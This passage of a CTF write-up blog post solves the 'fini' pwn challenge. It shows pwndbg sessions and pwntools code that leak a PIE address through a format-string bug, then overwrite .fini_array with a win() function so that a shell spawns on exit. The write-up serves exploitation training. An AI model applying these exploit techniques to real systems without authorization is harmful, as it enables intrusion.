style="--0:#6F42C1;--1:#B392F0">%x.%x</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Hello, 341636c0.0</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">!</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">1) write</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">2) exit</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">&gt; ^C</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ./challenge=== FINIsh this challenge ;) ===What's your name?%x.%xHello, 341636c0.0!1) write2) exit> ^C"><div></div></button></div></figure></div>
<p>We can use this fmt-string vulnerability to leak a PIE addr using which we can bypass ASLR.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:20ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$ gdb -q ./challenge</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; disas main</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ gdb -q ./challenge...SNIP...pwndbg> disas main"><div></div></button></div></figure></div>
<p><img src="https://github.com/user-attachments/assets/bdb321d0-f439-42ca-bf25-c6e28b3168d7" alt/></p>
<p>Breaking after the <code>fgets()</code> call to analyze the memory around our input:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="shell" class="wrap" style="--ecMaxLine:69ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">b</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">*</span><span style="--0:#032F62;--1:#9ECBFF">main+146</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Breakpoint</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">at</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0x1142</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg</span><span style="--0:#24292E;--1:#E1E4E8">&gt; </span><span style="--0:#032F62;--1:#9ECBFF">r</span></div></div><div class="ec-line"><div class="code"><span style="--0:#005CC5;--1:#79B8FF">..</span><span style="--0:#032F62;--1:#9ECBFF">.SNIP.</span><span style="--0:#005CC5;--1:#79B8FF">..</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">===</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">FINIsh</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">this</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">challenge</span><span style="--0:#24292E;--1:#E1E4E8"> ;) ===</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">What\</span><span style="--0:#6F42C1;--1:#B392F0">&#39;s your name?</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">AAAAAAAA</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Breakpoint 1, 0x0000555555555142 in main ()</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">...SNIP...</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg&gt; search AAAAAAAA stack</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Searching for byte: b&#39;</span><span style="--0:#6F42C1;--1:#B392F0">AAAAAAAA</span><span style="--0:#6F42C1;--1:#B392F0">&#39;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">[stack]         0x7fffffffdc00 &#39;</span><span style="--0:#6F42C1;--1:#B392F0">AAAAAAAA\n</span><span style="--0:#6F42C1;--1:#B392F0">&#39;</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg&gt; vmmap</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">...SNIP...</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">►   0x555555554000     0x555555555000 r--p     1000       0 challenge</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">►   0x555555555000     0x555555556000 r-xp     1000    1000 challenge</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">►   0x555555556000     0x555555557000 r--p     1000    2000 challenge</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">►   0x555555557000     0x555555558000 rw-p     1000    2000 challenge</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">...SNIP</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg&gt; dq 0x7fffffffdc00 30</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc00     4141414141414141 000000000000000a</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc10     0000000000040000 ffffffffffffffff</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc20     0000000000000040 0000000000000004</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc30     0000000000008000 0000000000000000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc40     0000008e00000006 0000000000000000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc50     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc60     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc70     0000000000000000 0000000000000000</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc80     00007fffffffddb8 0000000000000001</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdc90     0000000000000000 00007fffffffddc8</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdca0     00007ffff7ffd000 00007ffff7dd9ca8</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdcb0     00007fffffffdda0 00005555555550b0</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdcc0     0000000155554040 00007fffffffddb8</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdcd0     00007fffffffddb8 6a511514e74da407</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">00007fffffffdce0     0000000000000000 00007fffffffddc8</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">pwndbg&gt; p (0x00007fffffffdcb0-0x00007fffffffdc00)/8 + 9</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$3 = 31</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> b *main+146Breakpoint 1 at 0x1142pwndbg> r...SNIP...=== FINIsh this challenge ;) ===What\'s your name?AAAAAAAABreakpoint 1, 0x0000555555555142 in main ()...SNIP...pwndbg> search AAAAAAAA stackSearching for byte: b'AAAAAAAA'[stack]         0x7fffffffdc00 'AAAAAAAA\n'pwndbg> vmmap...SNIP...►   0x555555554000     0x555555555000 r--p     1000       0 challenge►   0x555555555000     0x555555556000 r-xp     1000    1000 challenge►   0x555555556000     0x555555557000 r--p     1000    2000 challenge►   0x555555557000     0x555555558000 rw-p     1000    2000 challenge...SNIPpwndbg> dq 0x7fffffffdc00 3000007fffffffdc00     4141414141414141 000000000000000a00007fffffffdc10     0000000000040000 ffffffffffffffff00007fffffffdc20     0000000000000040 000000000000000400007fffffffdc30     0000000000008000 000000000000000000007fffffffdc40     0000008e00000006 000000000000000000007fffffffdc50     0000000000000000 000000000000000000007fffffffdc60     0000000000000000 000000000000000000007fffffffdc70     0000000000000000 000000000000000000007fffffffdc80     00007fffffffddb8 000000000000000100007fffffffdc90     0000000000000000 00007fffffffddc800007fffffffdca0     00007ffff7ffd000 00007ffff7dd9ca800007fffffffdcb0     00007fffffffdda0 00005555555550b000007fffffffdcc0     0000000155554040 00007fffffffddb800007fffffffdcd0     00007fffffffddb8 6a511514e74da40700007fffffffdce0     0000000000000000 00007fffffffddc8pwndbg> p (0x00007fffffffdcb0-0x00007fffffffdc00)/8 + 9$3 = 31"><div></div></button></div></figure></div>
<p>Leaking the PIE address using the fmt-string vulnerability:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:32ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$ ./challenge</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">=== FINIsh this challenge ;) ===</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">What&#39;s your name?</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">%31$lx</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Hello, 55ca370b20b0</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">!</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">1) write</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">2) exit</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">&gt; ^C</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ ./challenge=== FINIsh this challenge ;) ===What's your name?%31$lxHello, 55ca370b20b0!1) write2) exit> ^C"><div></div></button></div></figure></div>
<p>We can calculate the PIE base by substracting the offset:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:49ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;?&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;%31$lx&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.recvuntil(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;, &quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">pieBase </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">int</span><span style="--0:#24292E;--1:#E1E4E8">(io.recvline().strip(), </span><span style="--0:#005CC5;--1:#79B8FF">16</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">10b0</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">log.success(</span><span style="--0:#BF3441;--1:#F97583">f</span><span style="--0:#032F62;--1:#9ECBFF">&quot;pieBase: </span><span style="--0:#005CC5;--1:#79B8FF">{hex</span><span style="--0:#24292E;--1:#E1E4E8">(pieBase)</span><span style="--0:#005CC5;--1:#79B8FF">}</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="io.sendlineafter(b&#34;?&#34;, b&#34;%31$lx&#34;)io.recvuntil(b&#34;, &#34;)pieBase = int(io.recvline().strip(), 16) - 0x10b0log.success(f&#34;pieBase: {hex(pieBase)}&#34;)"><div></div></button></div></figure></div>
<p><img src="https://github.com/user-attachments/assets/15e61dd5-be72-42a3-b61d-f5e7e58cc405" alt/></p>
<p>Now as the name of the challenge is <strong>fini</strong> which points us to the <code>.fini_array</code> which contains an array of functions which are executed sometime after main returns.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:62ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; info file</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">    </span></span><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">        </span></span><span style="--0:#24292e;--1:#e1e4e8">0x00000000000031c8 - 0x00000000000031d0 is .fini_array</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">    </span></span><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> info file    ...SNIP...        0x00000000000031c8 - 0x00000000000031d0 is .fini_array    ...SNIP..."><div></div></button></div></figure></div>
<p>We can overwrite this to the address of <code>win()</code> function so, when the main returns and the <code>.fini_array</code> function entries are executed our <code>win()</code> function spawns a shell.</p>
<p>Setting up the overwrite:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:61ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#005CC5;--1:#79B8FF">FINI_ARRAY</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">31c8</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#005CC5;--1:#79B8FF">WIN_ADDR</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">1380</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&gt; &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;1&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;(hex): &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">hex</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">FINI_ARRAY</span><span style="--0:#24292E;--1:#E1E4E8">).encode())</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;(hex, 8 bytes): &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">hex</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">WIN_ADDR</span><span style="--0:#24292E;--1:#E1E4E8">).encode())</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="FINI_ARRAY = pieBase + 0x31c8WIN_ADDR   = pieBase + 0x1380io.sendlineafter(b&#34;> &#34;, b&#34;1&#34;)io.sendlineafter(b&#34;(hex): &#34;, hex(FINI_ARRAY).encode())io.sendlineafter(b&#34;(hex, 8 bytes): &#34;, hex(WIN_ADDR).encode())"><div></div></button></div></figure></div>
<p>We can confirm the overwrite in <code>gdb</code>:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:62ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; info file</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">    </span></span><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">        </span></span><span style="--0:#24292e;--1:#e1e4e8">0x000055e8d60221c8 - 0x000055e8d60221d0 is .fini_array</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">    </span></span><span style="--0:#24292e;--1:#e1e4e8">...SNIP...</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; p win</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">$1 = {&lt;text variable, no debug info&gt;} 0x55e8d6020380 &lt;win&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; x/gx 0x000055e8d60221c8</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x55e8d60221c8: 0x000055e8d6020380</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> info file    ...SNIP...        0x000055e8d60221c8 - 0x000055e8d60221d0 is .fini_array    ...SNIP...pwndbg> p win$1 = {<text variable, no debug info>} 0x55e8d6020380 <win>pwndbg> x/gx 0x000055e8d60221c80x55e8d60221c8: 0x000055e8d6020380"><div></div></button></div></figure></div>
<p>Now, as we have overwritten the <code>.fini_array[0]</code> when we exit our <code>win()</code> function will be executed which will spawn a shell.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:29ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&gt; &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;2&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="io.sendlineafter(b&#34;> &#34;, b&#34;2&#34;)io.interactive()"><div></div></button></div></figure></div>
<p><img src="https://github.com/user-attachments/assets/98e5bc85-b0b8-4da0-8058-988922b34fc1" alt/></p>
<p>You can find the full exploit script <a href="https://raw.githubusercontent.com/z0v3r1n/z0v3r1n.github.io/main/content/posts/ctf_ac_fini/exploit.py" rel="nofollow noreferrer noopener" target="_blank">here</a>.
s</p> </article>  <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/fortid-ctf-2025_protect_the_env#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" viewBox="0 0 24 24" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> FortiD CTF 2025 – pwn/protect-the-environment </span> </div>  </a>  <a href="/blog/ctf-ac_babybof#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full" aria-disabled="false">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> CTF@AC 2025 – pwn/babybof </span> </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section> <button data-slot="button" class="items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9 group fixed right-8 bottom-8 z-50 hidden" id="scroll-to-top" title="Scroll to top" aria-label="Scroll to top"> <svg width="1em" height="1em" class="mx-auto size-4 transition-all group-hover:-translate-y-0.5" data-icon="lucide:arrow-up">   <symbol id="ai:lucide:arrow-up" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m5 12l7-7l7 7m-7 7V5"/></symbol><use href="#ai:lucide:arrow-up"></use>  </svg> </button> <script type="module">if(document.querySelector(".katex")&&!document.querySelector('link[href*="katex.min.css"]')){const e=document.createElement("link");e.rel="stylesheet",e.href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css",document.head.appendChild(e)}</script>  </main> <footer class="mx-auto mb-8 flex w-full max-w-3xl flex-col items-center justify-center gap-y-2 px-4 sm:mb-4 sm:flex-row sm:justify-between"> <div class="flex flex-wrap items-center justify-center gap-x-2 text-center"> <span class="text-muted-foreground text-sm">
&copy; 2025 z0v3r1n
</span> </div> <ul class="flex flex-wrap gap-2" role="list"> <li> <a href="https://github.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="GitHub" title="GitHub">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:github">   <symbol id="ai:lucide:github" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5c.08-1.25-.27-2.48-1-3.5c.28-1.15.28-2.35 0-3.5c0 0-1 0-3 1.5c-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.4 5.4 0 0 0 4 9c0 3.5 3 5.5 6 5.5c-.39.49-.68 1.05-.85 1.65S8.93 17.38 9 18v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></g></symbol><use href="#ai:lucide:github"></use>  </svg>  </a> </li><li> <a href="https://x.com/z0v3r1n" target="_blank" class="duration-300 ease-in-out inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 size-9" aria-label="Twitter" title="Twitter">  <svg width="1em" height="1em" class="size-4" data-icon="lucide:twitter">   <symbol id="ai:lucide:twitter" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6c2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4c-.9-4.2 4-6.6 7-3.8c1.1 0 3-1.2 3-1.2"/></symbol><use 